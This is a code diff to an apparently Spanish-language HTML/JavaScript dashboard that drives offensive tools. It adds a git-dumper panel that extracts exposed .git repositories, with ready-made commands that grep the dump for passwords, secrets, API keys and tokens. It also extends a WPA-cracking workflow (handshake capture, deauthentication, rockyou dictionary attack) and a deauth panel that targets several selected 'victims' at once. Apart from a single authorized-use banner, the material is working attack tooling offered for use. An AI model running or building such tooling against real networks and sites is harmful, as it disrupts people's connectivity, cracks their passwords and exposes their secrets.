@@ -627,6 +627,7 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="s-item" onclick="sw('katana',this)"><div class="s-dot"></div><span class="s-icon">◈</span>KATANA</div>
     <div class="s-item" onclick="sw('nuclei',this)"><div class="s-dot"></div><span class="s-icon">⬡</span>NUCLEI</div>
     <div class="s-item" onclick="sw('encoder',this)"><div class="s-dot"></div><span class="s-icon">⊞</span>ENCODER <span class="s-badge">NEW</span></div>
+    <div class="s-item" onclick="sw('gitdumper',this)"><div class="s-dot"></div><span class="s-icon">⬡</span>GIT-DUMPER</div>
   </div>
 
   <!-- SYSTEM -->
@@ -1754,57 +1755,81 @@ textarea.fi{resize:vertical;min-height:48px}
 <!-- ══ AIRCRACK ══ -->
 <div id="p-aircrack" class="panel">
   <div class="pt">AIRCRACK-NG <span class="ptd">— Wireless WPA attack suite</span></div>
+
+  <!-- Auto-fill hint -->
+  <div id="ac-autofill-hint" style="display:none;margin-bottom:6px;padding:5px 9px;border-radius:3px;border:1px solid #0d2010;background:#020704;font-size:12px;color:var(--mut)">
+    ⬆ BSSID/CANAL auto-rellenados desde WiFi Disconnect — <button class="kbtn" style="font-size:11px;padding:1px 6px" onclick="acClearAutoFill()">LIMPIAR</button>
+  </div>
+
   <div class="row">
     <div class="ig"><div class="lbl">INTERFAZ</div><input class="fi" id="ac-if" placeholder="wlan0" oninput="bAir()"></div>
-    <div class="ig"><div class="lbl">BSSID</div><input class="fi" id="ac-bs" placeholder="AA:BB:CC:DD:EE:FF" oninput="bAir()"></div>
+    <div class="ig"><div class="lbl">BSSID <span style="color:var(--dim);font-size:11px">← de WiFi Disconnect</span></div><input class="fi" id="ac-bs" placeholder="AA:BB:CC:DD:EE:FF" oninput="bAir()"></div>
     <div class="ig" style="max-width:58px"><div class="lbl">CANAL</div><input class="fi" id="ac-ch" placeholder="6" oninput="bAir()"></div>
+    <div class="ig"><div class="lbl">CAP FILE</div>
+      <div class="wl-row">
+        <input class="fi" id="ac-cap" value="/tmp/captura-01.cap" oninput="bAir()">
+        <button class="wl-browse" onclick="wlBrowse('ac-cap', bAir)" title="Explorar">📂</button>
+      </div></div>
     <div class="ig"><div class="lbl">WORDLIST</div>
       <div class="wl-row">
         <input class="fi" id="ac-wl" value="/usr/share/wordlists/rockyou.txt" oninput="bAir()">
         <button class="wl-browse" onclick="wlBrowse('ac-wl', bAir)" title="Explorar">📂</button>
       </div></div>
   </div>
+
   <div style="display:flex;flex-direction:column;gap:5px">
+
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">1 — Monitor mode</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 1 — Activar modo monitor</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Pone la interfaz en modo monitor. Ejecuta una vez.</div>
       <div class="cmd-text" id="ac-1"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
         <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-1'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-1')">COPY</button>
       </div>
     </div>
+
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">2 — Scan networks</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 2 — Escanear redes</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Lista todas las redes WiFi visibles. Anota el BSSID y CANAL del objetivo.</div>
       <div class="cmd-text" id="ac-5"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
         <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-5'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-5')">COPY</button>
       </div>
     </div>
+
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">3 — Capture handshake</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 3 — Capturar handshake</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Enfoca la red objetivo y captura el 4-way handshake. Guarda en <span style="color:var(--cyan)" id="ac-cap-hint">/tmp/captura</span>. Mantén corriendo hasta ver WPA handshake.</div>
       <div class="cmd-text" id="ac-2"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
         <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-2'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-2')">COPY</button>
       </div>
     </div>
+
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">4 — Deauth</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 4 — Deauth (forzar handshake)</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Opcional: desconecta clientes para que se reconecten y generen el handshake más rápido.</div>
       <div class="cmd-text" id="ac-3"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
         <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-3'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-3')">COPY</button>
       </div>
     </div>
-    <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">5 — Crack</div>
+
+    <div style="background:#020403;border:1px solid #2a1500;border-radius:4px;padding:7px 10px">
+      <div style="font-size:12px;color:var(--yellow);margin-bottom:2px;letter-spacing:1px">PASO 5 — Crackear contraseña</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Ataque de diccionario sobre el .cap capturado. Requiere handshake y wordlist.</div>
+      <div id="ac-crack-warn" style="display:none;font-size:12px;color:var(--red);margin-bottom:4px">⚠ Verifica: BSSID, ruta .cap y wordlist antes de ejecutar.</div>
       <div class="cmd-text" id="ac-4"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-4'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px;background:#120a00;border-color:var(--yellow);color:var(--yellow)" onclick="acCrack()">▶ CRACK</button>
         <button class="kbtn" onclick="cpCmd('ac-4')">COPY</button>
       </div>
     </div>
+
   </div>
   <div class="out-area" id="ac-out" style="margin-top:9px"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('ac-out')">CLEAR</button></div><div class="out-content" id="ac-out-c"></div></div>
 </div>
@@ -1832,8 +1857,8 @@ textarea.fi{resize:vertical;min-height:48px}
       <input class="fi" id="wd-ch" placeholder="6" oninput="bWd()">
     </div>
     <div class="ig">
-      <div class="lbl">STATION <span style="color:var(--dim);font-size:11px">← click en tabla</span></div>
-      <input class="fi" id="wd-st" placeholder="BB:CC:DD:EE:FF:00" oninput="bWd()">
+      <div class="lbl">VÍCTIMAS <span style="color:var(--dim);font-size:11px">← click en tabla</span></div>
+      <div id="wd-station-badge" style="display:flex;align-items:center;min-height:28px;color:var(--dim);font-size:12px;cursor:default;background:#020403;border:1px solid var(--brd);border-radius:3px;padding:4px 8px;font-family:'JetBrains Mono',monospace">ninguna seleccionada</div>
     </div>
     <div class="ig" style="max-width:80px">
       <div class="lbl">BANDA</div>
@@ -1883,7 +1908,7 @@ textarea.fi{resize:vertical;min-height:48px}
 
     <div id="wd-card-3" style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px;opacity:.5;pointer-events:none">
       <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 3 — Ver dispositivos conectados</div>
-      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Enfoca la red objetivo. <b style="color:var(--yellow)">Click en fila STATION</b> → rellena víctima. Luego STOP.</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Enfoca la red objetivo. <b style="color:var(--yellow)">Click en fila STATION</b> → toggle selección. Puedes seleccionar múltiples. Luego STOP.</div>
       <div class="cmd-text" id="wd-3"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
         <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="wdRun(3,this)">▶ RUN</button>
@@ -1894,10 +1919,10 @@ textarea.fi{resize:vertical;min-height:48px}
 
     <div id="wd-card-4" style="background:#020403;border:1px solid #3a1010;border-radius:4px;padding:7px 10px;opacity:.5;pointer-events:none">
       <div style="font-size:12px;color:var(--red);margin-bottom:2px;letter-spacing:1px">PASO 4 — DEAUTH ATTACK</div>
-      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Envía paquetes de desconexión continuos. Pulsa STOP cuando quieras terminar.</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Envía paquetes de desconexión continuos. Víctimas: <span id="wd-victim-count" style="color:var(--yellow)">ninguna</span>. Pulsa STOP cuando quieras.</div>
       <div class="cmd-text" id="wd-4"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:12px;background:#1a0505;border-color:var(--red);color:var(--red)" onclick="wdRun(4,this)">▶ ATTACK</button>
+        <button id="wd-attack-btn" class="rbtn" style="padding:3px 9px;font-size:12px;background:#1a0505;border-color:var(--red);color:var(--red)" onclick="wdRun(4,this)">▶ ATTACK</button>
         <button class="sbtn wd-sbtn" style="border-color:var(--red);color:var(--red)" onclick="wdStop()" disabled>■ STOP</button>
         <button class="kbtn" onclick="cpCmd('wd-4')">COPY</button>
       </div>
@@ -2719,6 +2744,122 @@ textarea.fi{resize:vertical;min-height:48px}
   <div class="out-area" id="nc-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('nc-out')">CLEAR</button></div><div class="out-content" id="nc-out-c"></div></div>
 </div>
 
+<!-- ══ GIT-DUMPER ══ -->
+<div id="p-gitdumper" class="panel">
+  <div class="pt">GIT-DUMPER <span class="ptd">— Extrae repositorios .git expuestos</span></div>
+
+  <!-- AVISO -->
+  <div style="padding:5px 9px;margin-bottom:9px;background:#070301;border:1px solid #2a1500;border-radius:3px;font-size:12px;color:var(--mut)">
+    ⚠ Uso exclusivo en entornos autorizados. git-dumper recupera el repositorio completo si el servidor sirve .git/ sin restricciones.
+  </div>
+
+  <!-- INSTALL BLOCK -->
+  <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px;margin-bottom:10px">
+    <div style="font-size:12px;color:var(--mut);letter-spacing:1px;margin-bottom:5px">INSTALACIÓN</div>
+    <div style="display:flex;align-items:center;gap:7px;flex-wrap:wrap">
+      <button class="kbtn" style="border-color:#c8a020;color:#c8a020" onclick="gdInstall()">⬇ INSTALAR git-dumper</button>
+      <button class="kbtn" onclick="gdCheckInstall()">✓ VERIFICAR</button>
+      <span id="gd-install-status" style="font-size:12px;color:var(--mut)"></span>
+    </div>
+    <div style="font-size:11px;color:var(--dim);margin-top:5px">pip3 install git-dumper</div>
+  </div>
+
+  <!-- INPUTS PRINCIPALES -->
+  <div class="row">
+    <div class="ig w4">
+      <div class="lbl">URL TARGET <span style="color:var(--dim);font-size:11px">— /.git se agrega automáticamente</span></div>
+      <input class="fi" id="gd-url" placeholder="http://target.com" oninput="bGd()">
+    </div>
+    <div class="ig">
+      <div class="lbl">CARPETA DE SALIDA</div>
+      <div class="wl-row">
+        <input class="fi" id="gd-outdir" value="./dumped-repo" oninput="bGd()">
+        <button class="wl-browse" onclick="wlBrowse('gd-outdir', bGd)" title="Explorar">📂</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FLAGS NUMÉRICOS -->
+  <div class="row" style="margin-top:6px">
+    <div class="ig" style="max-width:80px">
+      <div class="lbl">--jobs</div>
+      <input class="fi" id="gd-jobs" placeholder="10" oninput="bGd()">
+    </div>
+    <div class="ig" style="max-width:80px">
+      <div class="lbl">--retry</div>
+      <input class="fi" id="gd-retry" placeholder="3" oninput="bGd()">
+    </div>
+    <div class="ig" style="max-width:80px">
+      <div class="lbl">--timeout</div>
+      <input class="fi" id="gd-timeout" placeholder="10" oninput="bGd()">
+    </div>
+    <div class="ig">
+      <div class="lbl">--proxy</div>
+      <input class="fi" id="gd-proxy" placeholder="http://127.0.0.1:8080" oninput="bGd()">
+    </div>
+    <div class="ig">
+      <div class="lbl">--user-agent</div>
+      <input class="fi" id="gd-ua" placeholder="Mozilla/5.0" oninput="bGd()">
+    </div>
+    <div class="ig">
+      <div class="lbl">--cookie</div>
+      <input class="fi" id="gd-cookie" placeholder="session=abc123" oninput="bGd()">
+    </div>
+  </div>
+
+  <!-- HEADERS DINÁMICOS -->
+  <div class="lbl" style="margin:7px 0 4px">--header <span style="color:var(--dim);font-size:11px">— múltiples</span></div>
+  <div id="gd-headers">
+    <div class="header-row">
+      <input class="fi" placeholder="Header name" style="max-width:140px">
+      <input class="fi" placeholder="Value">
+      <button class="del-btn" onclick="gdDelHeader(this)">✕</button>
+    </div>
+  </div>
+  <button class="kbtn" onclick="gdAddHeader()" style="margin-bottom:9px;font-size:12px">+ ADD HEADER</button>
+
+  <!-- FLAGS TOGGLE -->
+  <div class="lbl" style="margin-bottom:4px">OPCIONES</div>
+  <div class="checks" id="gd-op">
+    <div class="ck" data-v="--verbose">--verbose</div>
+  </div>
+
+  <!-- COMANDO GENERADO -->
+  <div class="cmd-preview">
+    <div class="cmd-lbl">COMANDO GIT-DUMPER</div>
+    <div class="cmd-text" id="gd-cmd"></div>
+  </div>
+
+  <!-- BOTONES -->
+  <div class="run-row">
+    <button class="rbtn" id="gd-run" onclick="runTool('gd')">▶ EJECUTAR</button>
+    <button class="sbtn" id="gd-stop" onclick="stopTool('gd')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('gd-cmd')">COPY CMD</button>
+  </div>
+
+  <!-- PAYLOADS RÁPIDOS -->
+  <div class="sdiv">PAYLOADS RÁPIDOS</div>
+  <div class="plist">
+    <div class="pitem"><span class="ptxt">git-dumper http://target.com/.git ./repo</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    <div class="pitem"><span class="ptxt">git-dumper http://target.com/.git ./repo --jobs 20</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    <div class="pitem"><span class="ptxt">git-dumper http://target.com/.git ./repo --proxy http://127.0.0.1:8080</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    <div class="pitem"><span class="ptxt">git-dumper http://target.com/.git ./repo --header 'Authorization: Bearer TOKEN'</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    <div class="pitem"><span class="ptxt">git log --oneline --all</span><span class="pcopy" onclick="runAndCopy(this)">RUN</span></div>
+    <div class="pitem"><span class="ptxt">git diff HEAD~1 HEAD --stat</span><span class="pcopy" onclick="runAndCopy(this)">RUN</span></div>
+    <div class="pitem"><span class="ptxt">git log --all --oneline --name-only | grep -iE '\.env|password|secret|config|key'</span><span class="pcopy" onclick="runAndCopy(this)">RUN</span></div>
+    <div class="pitem"><span class="ptxt">find ./dumped-repo -type f | xargs grep -lrE 'password|secret|api_key|token' 2>/dev/null</span><span class="pcopy" onclick="runAndCopy(this)">RUN</span></div>
+  </div>
+
+  <!-- OUTPUT -->
+  <div class="out-area" id="gd-out">
+    <div class="out-hdr">
+      <span class="out-title">OUTPUT — GIT-DUMPER</span>
+      <button class="kbtn" onclick="clrOut('gd-out')">CLEAR</button>
+    </div>
+    <div class="out-content" id="gd-out-c"></div>
+  </div>
+</div>
+
 <!-- ══ TOOLS STATUS ══ -->
 <div id="p-tools" class="panel">
   <div class="pt">HERRAMIENTAS <span class="ptd">— Estado en tu Kali</span></div>
@@ -3524,6 +3665,7 @@ https://xxxx.ngrok.io/api/phish/land/TRACK_ID</pre>
    ══════════════════════════════════════════════════════ */
 const API = 'http://localhost:5000/api';
 let serverOk = false;
+let IS_ROOT = false;
 const activeJobs = {};   // prefix → {job_id, es}
 const rawBuffers = {};   // prefix → string[]
 const hist = [];
@@ -3533,11 +3675,19 @@ let termHist = [], termHistIdx = -1;
 // impacket resolved paths cache
 const impCache = {};
 
+// Returns '' when already root, 'sudo ' otherwise
+function sp() { return IS_ROOT ? '' : 'sudo '; }
+
 /* ─── SERVER PING ─────────────────────────────────────── */
 async function ping() {
   try {
     const r = await fetch(API + '/tools/status', { signal: AbortSignal.timeout(2000) });
     serverOk = r.ok;
+    if (serverOk) {
+      const rr = await fetch(API + '/is_root', { signal: AbortSignal.timeout(2000) });
+      if (rr.ok) { const d = await rr.json(); IS_ROOT = !!d.root; }
+      bWd(); bAir();
+    }
   } catch { serverOk = false; }
   const el = document.getElementById('srv-status');
   el.textContent = serverOk ? '● ONLINE' : '● OFFLINE';
@@ -5307,16 +5457,21 @@ parsers.ef = r => {
 
 const wdState = {
   step:0, aps:{}, stations:{},
+  selectedAP: null,          // {bssid, ch, essid} — AP actualmente enfocado
+  selectedStations:[],
   deauthPkts:0, disconnected:false, activeBtn:null,
   autoStopTimer:null, cdInterval:null,
 };
 
 function wdUnlock(n){const c=document.getElementById('wd-card-'+n);if(c){c.style.opacity='1';c.style.pointerEvents='';}}
+function wdLockCard(n){const c=document.getElementById('wd-card-'+n);if(c){c.style.opacity='.5';c.style.pointerEvents='none';}}
 function wdLive(html){const el=document.getElementById('wd-live-content');if(el)el.innerHTML=html;}
 
+/* ── Parser ──────────────────────────────────────────── */
 function wdParseLine(line){
   const l=line.trim(); if(!l)return;
-  // monitor mode
+
+  // Monitor mode activated
   const monM=l.match(/monitor mode.*?on\s+(\w+mon)\b/i)||l.match(/\((\w+mon)\)/);
   if(monM){
     const mi=monM[1];
@@ -5324,23 +5479,33 @@ function wdParseLine(line){
     const hint=document.getElementById('wd-mon-hint'); if(hint)hint.textContent=mi;
     return;
   }
-  // AP line
-  const apM=l.match(/^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(-?\d+)\s+\d+\s+\d+\s+\d+\s+(\d+)\s+\S+\s+(WPA2?|OPN|WEP)\b(.*)/);
-  if(apM){
-    const [,bssid,pwr,ch,enc,rest]=apM;
-    const essid=rest.trim().replace(/^\w+\s+\w+\s*/,'').trim()||'<hidden>';
-    wdState.aps[bssid.toUpperCase()]={bssid:bssid.toUpperCase(),essid,ch,pwr,enc};
-    return;
+
+  // AP line (step 2 — general scan)
+  if(wdState.step===2){
+    const apM=l.match(/^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(-?\d+)\s+\d+\s+\d+\s+\d+\s+(\d+)\s+\S+\s+(WPA2?|OPN|WEP)\b(.*)/);
+    if(apM){
+      const [,bssid,pwr,ch,enc,rest]=apM;
+      const essid=rest.trim().replace(/^\w+\s+\w+\s*/,'').trim()||'<hidden>';
+      wdState.aps[bssid.toUpperCase()]={bssid:bssid.toUpperCase(),essid,ch,pwr,enc};
+      return;
+    }
   }
-  // Station line
-  const stM=l.match(/^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(-?\d+)/);
-  if(stM){
-    const [,bssid,station,pwr]=stM;
-    if(!/FF:FF:FF:FF:FF:FF/i.test(station))
-      wdState.stations[station.toUpperCase()]={station:station.toUpperCase(),bssid:bssid.toUpperCase(),pwr};
-    return;
+
+  // Station line (step 3 — focused client scan)
+  // Only accept stations whose AP BSSID matches the selected AP — drops "not associated" and foreign clients
+  if(wdState.step===3){
+    const stM=l.match(/^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(-?\d+)/);
+    if(stM){
+      const [,apBssid,station,pwr]=stM;
+      if(/FF:FF:FF:FF:FF:FF/i.test(station)) return;         // broadcast — skip
+      if(/00:00:00:00:00:00/i.test(apBssid)) return;         // not associated — skip
+      if(wdState.selectedAP && apBssid.toUpperCase()!==wdState.selectedAP.bssid) return; // foreign AP — skip
+      wdState.stations[station.toUpperCase()]={station:station.toUpperCase(),bssid:apBssid.toUpperCase(),pwr};
+      return;
+    }
   }
-  // deauth packet
+
+  // Deauth packets (step 4)
   if(/Sending\s+\d+.*DeAuth/i.test(l)){
     wdState.deauthPkts++;
     const ackM=l.match(/\[(\d+)\|(\d+)\s+ACKs?\]/i);
@@ -5351,65 +5516,159 @@ function wdParseLine(line){
   }
 }
 
+/* ── Render helpers ──────────────────────────────────── */
 let _wdT=null;
 function wdRenderLive(){clearTimeout(_wdT);_wdT=setTimeout(_wdDraw,100);}
+
 function _wdDraw(){
-  const aps=Object.values(wdState.aps), stations=Object.values(wdState.stations);
-  if(!aps.length&&!stations.length)return;
-  let h='';
-  if(aps.length){
-    h+=`<div style="font-size:12px;color:var(--g);letter-spacing:1px;margin-bottom:4px">${aps.length} REDES — <span style="color:var(--cyan)">click fila → BSSID+CH</span></div>`;
-    h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
-    h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px">BSSID</td><td style="padding:2px 5px">ESSID</td><td style="padding:2px 5px">CH</td><td style="padding:2px 5px">PWR</td><td style="padding:2px 5px">ENC</td></tr>';
-    for(const ap of aps){
-      const pc=parseInt(ap.pwr)>-60?'var(--g)':parseInt(ap.pwr)>-75?'var(--yellow)':'var(--mut)';
-      const ec=ap.enc==='OPN'?'var(--red)':'var(--cyan)';
-      h+=`<tr onclick="wdSelectAP('${ap.bssid}','${ap.ch}')" style="cursor:pointer;border-top:1px solid #0d160f" onmouseover="this.style.background='#050d06'" onmouseout="this.style.background=''">`;
-      h+=`<td style="padding:3px 5px;color:var(--cyan)">${ap.bssid}</td>`;
-      h+=`<td style="padding:3px 5px;color:var(--txt);max-width:110px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${ap.essid}">${ap.essid}</td>`;
-      h+=`<td style="padding:3px 5px;color:var(--g)">${ap.ch}</td>`;
-      h+=`<td style="padding:3px 5px;color:${pc}">${ap.pwr}</td>`;
-      h+=`<td style="padding:3px 5px;color:${ec}">${ap.enc}</td></tr>`;
-    }
-    h+='</table>';
+  if(wdState.step===3) _wdDrawStations();
+  else                 _wdDrawAPTable();
+}
+
+// Build AP table HTML — highlights the currently selected AP
+function _wdBuildAPTable(aps){
+  const selBssid=wdState.selectedAP?wdState.selectedAP.bssid:null;
+  let h=`<div style="font-size:12px;color:var(--g);letter-spacing:1px;margin-bottom:4px">${aps.length} REDES — <span style="color:var(--cyan)">click fila → enfocar AP</span></div>`;
+  h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
+  h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px;width:16px"></td><td style="padding:2px 5px">BSSID</td><td style="padding:2px 5px">ESSID</td><td style="padding:2px 5px">CH</td><td style="padding:2px 5px">PWR</td><td style="padding:2px 5px">ENC</td></tr>';
+  for(const ap of aps){
+    const isSel=selBssid&&ap.bssid===selBssid;
+    const pc=parseInt(ap.pwr)>-60?'var(--g)':parseInt(ap.pwr)>-75?'var(--yellow)':'var(--mut)';
+    const ec=ap.enc==='OPN'?'var(--red)':'var(--cyan)';
+    const rowBg=isSel?'#031a08':'';
+    const bdr=isSel?'border-top:1px solid #0d2f14':'border-top:1px solid #0d160f';
+    h+=`<tr onclick="wdSelectAP('${ap.bssid}','${ap.ch}')" style="cursor:pointer;${bdr};background:${rowBg}" onmouseover="this.style.background='${isSel?'#051f0a':'#050d06'}'" onmouseout="this.style.background='${rowBg}'">`;
+    h+=`<td style="padding:3px 5px;font-size:11px;color:var(--g)">${isSel?'▶':''}</td>`;
+    h+=`<td style="padding:3px 5px;color:${isSel?'var(--g)':'var(--cyan)'}">${ap.bssid}</td>`;
+    h+=`<td style="padding:3px 5px;color:var(--txt);max-width:110px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${ap.essid}">${ap.essid}</td>`;
+    h+=`<td style="padding:3px 5px;color:var(--g)">${ap.ch}</td>`;
+    h+=`<td style="padding:3px 5px;color:${pc}">${ap.pwr}</td>`;
+    h+=`<td style="padding:3px 5px;color:${ec}">${ap.enc}</td></tr>`;
   }
-  if(stations.length){
-    h+=`<div style="font-size:12px;color:var(--yellow);letter-spacing:1px;margin:8px 0 4px">${stations.length} DISPOSITIVOS — <span style="color:var(--yellow)">click fila → STATION</span></div>`;
-    h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
-    h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px">STATION (víctima)</td><td style="padding:2px 5px">BSSID AP</td><td style="padding:2px 5px">PWR</td></tr>';
-    for(const st of stations){
-      h+=`<tr onclick="wdSelectStation('${st.station}')" style="cursor:pointer;border-top:1px solid #0d160f" onmouseover="this.style.background='#0a0800'" onmouseout="this.style.background=''">`;
-      h+=`<td style="padding:3px 5px;color:var(--yellow)">${st.station}</td><td style="padding:3px 5px;color:var(--mut)">${st.bssid}</td><td style="padding:3px 5px;color:var(--mut)">${st.pwr}</td></tr>`;
-    }
-    h+='</table>';
+  h+='</table>';
+  return h;
+}
+
+// Build station table HTML — only stations for selectedAP
+function _wdBuildStationTable(stations){
+  const selN=wdState.selectedStations.length;
+  const selLabel=selN>0?` — <span style="color:var(--red);font-weight:700">${selN}</span> <span style="color:var(--yellow)">seleccionada${selN>1?'s':''}</span>`:'';
+  let h=`<div style="font-size:12px;color:var(--yellow);letter-spacing:1px;margin:4px 0 4px">${stations.length} CLIENTE${stations.length!==1?'S':''}${selLabel} — <span style="color:var(--yellow)">click → toggle</span></div>`;
+  h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
+  h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px;width:28px"></td><td style="padding:2px 5px">MAC (víctima)</td><td style="padding:2px 5px">PWR</td></tr>';
+  for(const st of stations){
+    const sel=wdState.selectedStations.includes(st.station);
+    const rowBg=sel?'#1a0800':'';
+    const bdr=sel?'border-top:1px solid #3a1500':'border-top:1px solid #0d160f';
+    h+=`<tr onclick="wdSelectStation('${st.station}')" style="cursor:pointer;${bdr};background:${rowBg}" onmouseover="this.style.background='${sel?'#260f00':'#0a0800'}'" onmouseout="this.style.background='${rowBg}'">`;
+    h+=`<td style="padding:3px 5px;text-align:center;font-size:14px">${sel?'<span style="color:var(--red)">✓</span>':'<span style="color:#333">○</span>'}</td>`;
+    h+=`<td style="padding:3px 5px;color:${sel?'var(--red)':'var(--yellow)'};font-weight:${sel?700:400}">${st.station}</td>`;
+    h+=`<td style="padding:3px 5px;color:var(--mut)">${st.pwr}</td></tr>`;
+  }
+  h+='</table>';
+  return h;
+}
+
+// Draw step-2 mode: AP table only
+function _wdDrawAPTable(){
+  const aps=Object.values(wdState.aps);
+  if(!aps.length)return;
+  let h=_wdBuildAPTable(aps);
+  if(wdState.selectedAP){
+    const ap=wdState.selectedAP;
+    h+=`<div style="margin-top:7px;padding:5px 8px;background:#020704;border:1px solid #0d2010;border-radius:3px;font-size:12px">
+      <span style="color:var(--g)">▶ AP seleccionado:</span>
+      <span style="color:var(--cyan);margin-left:6px">${ap.essid||ap.bssid}</span>
+      <span style="color:var(--dim);margin-left:4px">${ap.bssid}</span>
+      <span style="color:var(--dim);margin-left:4px">— canal ${ap.ch}</span>
+      <span style="color:var(--mut);margin-left:10px">→ Ejecuta PASO 3 para ver clientes</span>
+    </div>`;
   }
   wdLive(h);
 }
 
+// Draw step-3 mode: context header + station table (filtered by selectedAP)
+function _wdDrawStations(){
+  const ap=wdState.selectedAP;
+  const stations=Object.values(wdState.stations);
+  let h='';
+  if(ap){
+    h+=`<div style="padding:3px 0 7px;font-size:12px;color:var(--mut)">Clientes de: <span style="color:var(--cyan)">${ap.essid||ap.bssid}</span>  <span style="color:var(--dim)">•</span>  <span style="color:var(--g)">${ap.bssid}</span>  <span style="color:var(--dim)">• canal ${ap.ch}</span></div>`;
+  }
+  if(!stations.length){
+    h+=`<div style="font-size:13px;color:var(--dim);font-style:italic;padding:4px 0">Sin clientes asociados detectados${ap?` para ${ap.essid||ap.bssid}`:''}...</div>`;
+    wdLive(h); return;
+  }
+  h+=_wdBuildStationTable(stations);
+  wdLive(h);
+}
+
+/* ── Deauth status bar ───────────────────────────────── */
 function wdUpdateDeauthBar(){
   const ds=document.getElementById('wd-deauth-status'); if(!ds||wdState.disconnected)return;
-  const t=gv('wd-st')||'??:??:??:??:??:??';
+  const sts=wdState.selectedStations;
   const bar='█'.repeat(Math.min((wdState.deauthPkts%8)+1,8));
-  ds.innerHTML=`<span style="color:var(--red)">⚡ ATACANDO</span>  <span style="color:var(--mut)">target:</span> <span style="color:var(--yellow)">${t}</span>  <span style="color:var(--mut)">pkts:</span> <span style="color:var(--red)">${wdState.deauthPkts}</span>  <span style="color:#2a0a0a">${bar}</span>`;
+  const tgt=sts.length>1
+    ?`<span style="color:var(--mut)">targets:</span> <span style="color:var(--red)">${sts.length} dispositivos</span>`
+    :`<span style="color:var(--mut)">target:</span> <span style="color:var(--yellow)">${sts[0]||'??:??:??:??:??:??'}</span>`;
